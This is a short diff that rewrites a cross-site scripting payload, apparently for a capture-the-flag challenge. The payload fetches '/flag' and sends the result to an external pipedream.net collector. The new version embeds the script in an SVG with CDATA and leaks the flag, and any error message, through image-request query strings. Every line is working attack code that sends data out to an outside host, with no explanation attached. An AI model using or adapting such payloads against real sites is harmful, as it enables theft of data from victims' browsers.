@@ -1,19 +1,14 @@
-<script>
-  fetch('/flag')
-    .then(r => r.text())
-    .then(flag => {
-      fetch('https://eokqbbiypxqueat.m.pipedream.net', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: 'SUCCESS: ' + flag
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    fetch('/flag')
+      .then(r => r.text())
+      .then(flag => {
+        new Image().src = 'https://eokqbbiypxqueat.m.pipedream.net/?flag=' + encodeURIComponent(flag);
+      })
+      .catch(e => {
+        new Image().src = 'https://eokqbbiypxqueat.m.pipedream.net/?error=' + encodeURIComponent(e.message);
       });
-    })
-    .catch(e => {
-      fetch('https://eokqbbiypxqueat.m.pipedream.net', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: 'ERROR: ' + e
-      });
-    });
-</script>
+  ]]></script>
+</svg>
+
 
